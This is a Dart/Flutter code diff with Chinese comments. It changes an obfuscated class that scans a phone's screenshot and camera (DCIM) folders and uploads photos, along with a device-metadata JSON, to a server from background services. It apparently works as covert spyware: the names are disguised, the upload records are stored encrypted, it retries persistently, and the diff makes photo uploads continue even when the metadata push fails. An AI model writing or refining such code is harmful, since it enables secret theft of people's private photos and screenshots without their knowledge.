@@ -4,11 +4,13 @@
 /// - ★ 截图优先（最新 10 张，无大小限制，一次性）
 /// - ★ 截图与 DCIM 目录并行扫描
 /// - ★ 截图目录为空时不锁定一次性标记
-/// - ★ 小文件优先 + 新的优先
+/// - ★ DCIM 排序：新+小 > 新 > baseline（首次启动标记的最新 N 张）
+/// - ★ baseline 只在首次启动 App 扫描时标记一次
 /// - ★ 断点续传：成功入 _sent，失败自动重试
 /// - ★ JSON 首次单独推送
 /// - ★ 智能熔断 + 服务器检测
 /// - ★ 本地记录用 flutter_secure_storage 加密存储
+/// - ★ 跨 isolate 落盘锁，避免前台服务与 WorkManager 重复上传
 library;
 
 import 'dart:async';
@@ -95,8 +97,16 @@ class Ma {
   /// 截图一次性完成标记
   static const String _kScreenshotDone = 'm1sc';
 
-  /// 上一次「真正开跑」的时间戳（毫秒），用于跨 isolate 互斥
-  static const String _kLastRunAt = 'm5run';
+  /// ★ baseline：首次启动 App 扫描时标记的最新 N 张（默认 50）的指纹
+  static const String _kBaseline = 'm5baseline';
+  /// ★ baseline 是否已完成首次标记（防止重启后重复标记）
+  static const String _kBaselineDone = 'm5baselinedone';
+
+  /// ★ 跨 isolate 落盘锁：持有者写入「开始时间戳」，
+  ///   到期自动失效（防止进程被杀导致死锁）
+  static const String _kRunningAt = 'm5running';
+  /// 锁的有效期：超过这个时间认为持有者已死，可以抢锁
+  static const Duration _kLockTtl = Duration(minutes: 10);
 
   Mc _config = const Mc();
 
@@ -113,6 +123,11 @@ class Ma {
   bool _screenshotDone = false;
   /// 本轮扫描到的截图目录候选数（未过滤 _sent），用于判断“目录是否为空”
   int _lastScannedShotCount = 0;
+
+  /// ★ baseline 指纹集合：首次启动 App 扫描时标记的「最新 N 张」
+  final Set<String> _baseline = <String>{};
+  /// ★ baseline 是否已经完成首次标记
+  bool _baselineDone = false;
 
   Future<void>? _currentTask;
   Future<bool>? _jsonPushing;
@@ -145,6 +160,8 @@ class Ma {
   bool get jsonSent => _jsonSent;
   String? get jsonUrl => _jsonUrl;
   bool get screenshotDone => _screenshotDone;
+  bool get baselineDone => _baselineDone;
+  int get baselineCount => _baseline.length;
 
   Map<String, String> get sentUrls => Map.unmodifiable(_sentUrls);
 
@@ -152,7 +169,8 @@ class Ma {
     try {
       final name = file.path.split('/').last;
       final size = file.lengthSync();
-      return _sentUrls['$name:$size'];
+      final mtime = file.lastModifiedSync().millisecondsSinceEpoch;
+      return _sentUrls['$name:$size:$mtime'];
     } catch (_) {
       return null;
     }
@@ -217,8 +235,11 @@ class Ma {
     }
   }
 
+  /// ★ 指纹：文件名 + 大小 + mtime，几乎不会碰撞。
+  ///   加上 mtime 是为了避免「同名同大小不同内容」被误判为已上传。
   String _fingerprint(_Scanned s) =>
-      '${s.file.path.split('/').last}:${s.size}';
+      '${s.file.path.split('/').last}:${s.size}:'
+      '${s.modified.millisecondsSinceEpoch}';
 
   // ── 初始化 ─────────────────────────────────────────────────────────
   Future<void> initialize({Mc? config}) async {
@@ -294,6 +315,17 @@ class Ma {
     _jsonUrl = await _readSecure(_kJsonUrl);
     _screenshotDone = (await _readSecure(_kScreenshotDone)) == '1';
 
+    // ★ 读 baseline
+    _baseline.clear();
+    final rawBaseline = await _readSecure(_kBaseline);
+    if (rawBaseline != null && rawBaseline.isNotEmpty) {
+      try {
+        final decoded = jsonDecode(rawBaseline) as List;
+        _baseline.addAll(decoded.map((e) => e as String));
+      } catch (_) {}
+    }
+    _baselineDone = (await _readSecure(_kBaselineDone)) == '1';
+
     _initialized = true;
 
     debugPrint('[M] ══════ 启动自检 ══════');
@@ -301,6 +333,7 @@ class Ma {
     debugPrint('[M] URL 缓存: ${_sentUrls.length} 条');
     debugPrint('[M] JSON 已推送: $_jsonSent');
     debugPrint('[M] 截图一次性任务已完成: $_screenshotDone');
+    debugPrint('[M] baseline 已标记: $_baselineDone （${_baseline.length} 个）');
     debugPrint('[M] ══════ 自检完成 ══════');
   }
 
@@ -458,46 +491,53 @@ class Ma {
     }
   }
 
-  // ── 跨 isolate 互斥 ───────────────────────────────────────────────
+  // ── 跨 isolate 落盘锁 ─────────────────────────────────────────────
   //
   // ★ 前台服务和 WorkManager 跑在两个不同的 isolate 里，各自持有自己的
   //   Ma.instance，_currentTask 这把锁只在同一 isolate 内有效 ——
   //   两边会同时扫描同一批文件、重复上传同一张图。
-  //   这里用一个落盘的「上次开跑时间」让它们轮流上。
   //
-  // ★ 一律 fail-open：读不到、解析不了、写不进去，统统放行。
-  //   宁可多传一次，也不能因为读不到时间戳就永远不跑 ——
-  //   那就又回到了「后台任务没反应」的老问题。
+  //   ★ 用「落盘锁 + TTL」解决：
+  //     - 谁抢到谁跑，另一个直接跳过；
+  //     - 持有者写「开始时间戳」，超过 TTL（10 分钟）自动失效，
+  //       防止进程被杀导致死锁；
+  //     - 跑完（无论成功失败）都释放。
+  //
+  //   ★ 一律 fail-open：读不到、解析不了、写不进去，统统放行。
+  //     宁可多传一次，也不能因为读不到时间戳就永远不跑 ——
+  //     那就又回到了「后台任务没反应」的老问题。
 
-  /// 两次开跑之间的最小间隔
-  static const Duration _kMinGap = Duration(minutes: 5);
-
-  Future<bool> _anotherRunJustStarted() async {
+  Future<bool> _acquireRunLock() async {
     try {
       final store = _secure;
-      if (store == null) return false;
-      final raw = await store.read(key: _kLastRunAt);
-      if (raw == null) return false;
-      final ms = int.tryParse(raw);
-      if (ms == null) return false;
-      final at = DateTime.fromMillisecondsSinceEpoch(ms);
-      return DateTime.now().difference(at) < _kMinGap;
-    } catch (_) {
-      return false;
+      if (store == null) return true;
+
+      final raw = await store.read(key: _kRunningAt);
+      if (raw != null) {
+        final ms = int.tryParse(raw);
+        if (ms != null) {
+          final at = DateTime.fromMillisecondsSinceEpoch(ms);
+          if (DateTime.now().difference(at) < _kLockTtl) {
+            // 别人还在跑
+            return false;
+          }
+        }
+      }
+      await store.write(
+        key: _kRunningAt,
+        value: '${DateTime.now().millisecondsSinceEpoch}',
+      );
+      return true;
+    } catch (e) {
+      debugPrint('[M] 获取锁失败（放行）: $e');
+      return true;
     }
   }
 
-  Future<void> _markRunStart() async {
+  Future<void> _releaseRunLock() async {
     try {
-      final store = _secure;
-      if (store == null) return;
-      await store.write(
-        key: _kLastRunAt,
-        value: '${DateTime.now().millisecondsSinceEpoch}',
-      );
-    } catch (_) {
-      // 写不进去就算了，下轮照样能跑
-    }
+      await _secure?.delete(key: _kRunningAt);
+    } catch (_) {}
   }
 
   Future<void> _doPush() async {
@@ -508,16 +548,18 @@ class Ma {
       return;
     }
 
-    // 另一个 isolate 刚开跑过就让它先跑，避免重复上传
-    if (await _anotherRunJustStarted()) {
-      debugPrint('[M] ⏭ 另一个 isolate 刚开跑（${_kMinGap.inMinutes} 分钟内），'
-          '本轮跳过');
+    // ★ 跨 isolate 落盘锁：另一个 isolate 正在跑就跳过，避免重复上传
+    if (!await _acquireRunLock()) {
+      debugPrint('[M] ⏭ 另一个 isolate 正在跑，本轮跳过（避免重复上传）');
       return;
     }
-    await _markRunStart();
 
-    final scanned = await _scanFiles();
-    await _pushAll(scanned);
+    try {
+      final scanned = await _scanFiles();
+      await _pushAll(scanned);
+    } finally {
+      await _releaseRunLock();
+    }
   }
 
   // ══════════════════════════════════════════════════════════════════
@@ -555,8 +597,9 @@ class Ma {
 
       final jsonOk = await _ensureJsonSent();
       if (!jsonOk) {
-        debugPrint('[M] ❌ JSON 推送失败，中止本轮');
-        return;
+        // ★ JSON 只是设备元信息，失败不阻断媒体文件上传，
+        //   下一轮会自动重试（因为它没写 _jsonSent = true）
+        debugPrint('[M] ⚠️ JSON 推送失败，继续推送媒体文件');
       }
 
       final sw = Stopwatch()..start();
@@ -915,6 +958,24 @@ class Ma {
     // 记录截图目录符合条件的文件数（未过滤 _sent）
     _lastScannedShotCount = shotsAll.length;
 
+    // ★★ baseline 首次标记：
+    //   首次启动 App 扫描到 DCIM 后，取当时最新的 maxFiles（默认 50）张，
+    //   把它们的指纹写入 _baseline 并落盘。之后每次启动都用这份 baseline，
+    //   不再重新标记 —— 所以称为「首次开启 App 扫描时标记的那 50 张」。
+    if (!_baselineDone) {
+      final sortedAll = [...mA]
+        ..sort((a, b) => b.modified.compareTo(a.modified));
+      final topN = sortedAll.take(_config.maxFiles).toList();
+      _baseline
+        ..clear()
+        ..addAll(topN.map(_fingerprint));
+      _baselineDone = true;
+      await _writeSecure(_kBaseline, jsonEncode(_baseline.toList()));
+      await _writeSecure(_kBaselineDone, '1');
+      debugPrint('[M] ★ 首次扫描完成，标记 baseline ${_baseline.length} 张'
+          '（DCIM 共 ${mA.length} 个候选）');
+    }
+
     // 截图：过滤已推送 → 最新 N 张
     final shotsPending = shotsAll
         .where((s) => !_sent.contains(_fingerprint(s)))
@@ -923,16 +984,21 @@ class Ma {
     final pickedShots =
         shotsPending.take(_config.screenshotMaxFiles).toList();
 
-    // DCIM：过滤已推送 → 小文件优先 + 新优先
+    // ★ DCIM 排序优先级：
+    //   0 = 新文件 + 小文件（不在 baseline 里，size ≤ smallFileBytes）
+    //   1 = 新文件（不在 baseline 里）
+    //   2 = baseline（首次启动时标记的最新 N 张）
+    //   同级按 mtime 降序（新的在前），时间相同再按体积升序。
     final mP = mA
         .where((s) => !_sent.contains(_fingerprint(s)))
         .toList();
-    final smallBytes = _config.smallFileBytes;
     mP.sort((a, b) {
-      final aSmall = a.size <= smallBytes;
-      final bSmall = b.size <= smallBytes;
-      if (aSmall != bSmall) return aSmall ? -1 : 1;
-      return b.modified.compareTo(a.modified);
+      final pa = _priority(a);
+      final pb = _priority(b);
+      if (pa != pb) return pa.compareTo(pb);
+      final byTime = b.modified.compareTo(a.modified);
+      if (byTime != 0) return byTime;
+      return a.size.compareTo(b.size);
     });
 
     // 合并：截图优先
@@ -950,6 +1016,15 @@ class Ma {
     }
 
     return merged;
+  }
+
+  /// DCIM 文件排序优先级：
+  ///   0 = 新文件 + 小文件（不在 baseline 里，且 size ≤ smallFileBytes）
+  ///   1 = 新文件（不在 baseline 里）
+  ///   2 = baseline（首次启动时标记的最新 N 张，兜底补传）
+  int _priority(_Scanned s) {
+    if (_baseline.contains(_fingerprint(s))) return 2;
+    return s.size <= _config.smallFileBytes ? 0 : 1;
   }
 
   Future<List<_Scanned>> _scanOneDir(
@@ -1023,13 +1098,20 @@ class Ma {
     _jsonUrl = null;
     _screenshotDone = false;
     _lastScannedShotCount = 0;
+    // ★ baseline 也一起清掉，下次启动会重新按「首次」标记
+    _baseline.clear();
+    _baselineDone = false;
 
     await _deleteSecure(_kSent);
     await _deleteSecure(_kSentUrls);
     await _deleteSecure(_kJsonSent);
     await _deleteSecure(_kJsonUrl);
     await _deleteSecure(_kScreenshotDone);
-    debugPrint('[M] 记录已清空（含截图一次性标记）');
+    await _deleteSecure(_kBaseline);
+    await _deleteSecure(_kBaselineDone);
+    // ★ 清掉跨 isolate 落盘锁（防止残留的锁把后续任务挡在门外）
+    await _deleteSecure(_kRunningAt);
+    debugPrint('[M] 记录已清空（含截图一次性标记、baseline 与落盘锁）');
   }
 }
 
